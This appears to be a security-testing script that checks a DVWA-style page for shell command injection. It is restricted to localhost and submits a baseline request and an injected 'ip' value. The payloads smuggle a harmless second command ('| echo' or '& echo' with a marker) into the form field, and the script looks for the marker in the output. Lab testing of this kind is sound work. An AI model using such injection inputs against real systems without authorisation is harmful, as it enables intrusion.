#!/usr/bin/env python3
"""CMD-002 command-injection verification draft (localhost lab only)."""
import argparse
import http.cookiejar
import json
import re
import sys
import urllib.error
import urllib.parse
import urllib.request

LINUX_PAYLOAD = '127.0.0.1 | echo {marker}'
WINDOWS_PAYLOAD = '127.0.0.1 & echo {marker}'


def check_local(url):
    parts = urllib.parse.urlsplit(url)
    if parts.scheme not in ('http', 'https'):
        raise SystemExit('URL scheme must be http or https')
    if (parts.hostname or '').lower() not in ('localhost', '127.0.0.1', '::1'):
        raise SystemExit('target host must be localhost, 127.0.0.1 or ::1')
    return url


class NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None


def build_opener(cookie_path):
    jar = http.cookiejar.MozillaCookieJar()
    jar.load(cookie_path, ignore_discard=True, ignore_expires=True)
    return urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar), NoRedirect())


def request(opener, url, data, timeout):
    body = urllib.parse.urlencode(data).encode('utf-8') if data is not None else None
    req = urllib.request.Request(url, data=body, method='POST' if body else 'GET')
    if body:
        req.add_header('Content-Type', 'application/x-www-form-urlencoded')
    try:
        with opener.open(req, timeout=timeout) as resp:
            return resp.status, resp.read().decode('utf-8', 'replace')
    except urllib.error.HTTPError as exc:
        return exc.code, exc.read().decode('utf-8', 'replace')


def pre_regions(html):
    return re.findall(r'<pre>(.*?)</pre>', html, flags=re.S | re.I)


def page_token(html, name):
    pattern = r'name=["]%s["][^>]*value=["]([^"]+)["]'
    match = re.search(pattern % re.escape(name), html)
    if match:
        return match.group(1)
    pattern = r'value=["]([^"]+)["][^>]*name=["]%s["]'
    match = re.search(pattern % re.escape(name), html)
    return match.group(1) if match else None


def submit(opener, url, form, token_name, timeout):
    data = dict(form)
    if token_name:
        status, html = request(opener, url, None, timeout)
        token = page_token(html, token_name)
        if not token:
            print('TOKEN_NOT_FOUND status=%s' % status)
            return None, None
        data[token_name] = token
    return request(opener, url, data, timeout)


def marker_lines(regions, marker):
    hits = []
    for region in regions:
        for line in region.splitlines():
            if marker in line:
                hits.append(line.strip())
    return hits


def main():
    parser = argparse.ArgumentParser(description='CMD-002 shell command injection check')
    parser.add_argument('--url', default='http://127.0.0.1/dvwa/vulnerabilities/exec/')
    parser.add_argument('--cookie', required=True, help='Netscape cookie file for an authenticated session')
    parser.add_argument('--target-ip', default='127.0.0.1')
    parser.add_argument('--os', choices=('linux', 'windows'), default='linux')
    parser.add_argument('--marker', default='CMD002_MARKER')
    parser.add_argument('--token-name', default=None, help='only if the deployed page form really carries a token')
    parser.add_argument('--timeout', type=float, default=10.0)
    args = parser.parse_args()
    check_local(args.url)
    payload = (LINUX_PAYLOAD if args.os == 'linux' else WINDOWS_PAYLOAD).format(marker=args.marker)
    try:
        opener = build_opener(args.cookie)
    except OSError as exc:
        print('COOKIE_LOAD_ERROR %s' % exc)
        return 3
    try:
        base_status, base_html = submit(opener, args.url, {'Submit': 'Submit', 'ip': args.target_ip}, args.token_name, args.timeout)
        inj_status, inj_html = submit(opener, args.url, {'Submit': 'Submit', 'ip': payload}, args.token_name, args.timeout)
    except (urllib.error.URLError, OSError) as exc:
        print('CONNECTION_ERROR %s' % exc)
        return 2
    if base_status is None or inj_status is None:
        return 4
    base_pres = pre_regions(base_html)
    inj_pres = pre_regions(inj_html)
    result = {
        'url': args.url,
        'os': args.os,
        'payload': payload,
        'baseline_status': base_status,
        'payload_status': inj_status,
        'baseline_pre_regions': len(base_pres),
        'payload_pre_regions': len(inj_pres),
        'baseline_marker_lines': marker_lines(base_pres, args.marker),
        'payload_marker_lines': marker_lines(inj_pres, args.marker),
        'payload_has_ping_stats': any(('bytes from' in r) or ('Reply from' in r) for r in inj_pres),
        'redirects_followed': False,
    }
    print(json.dumps(result, ensure_ascii=False, indent=2))
    if result['payload_marker_lines'] and not result['baseline_marker_lines']:
        print('OBSERVED_MARKER_IN_COMMAND_OUTPUT')
        return 0
    print('NO_MARKER_OBSERVED')
    return 1


if __name__ == '__main__':
    sys.exit(main())
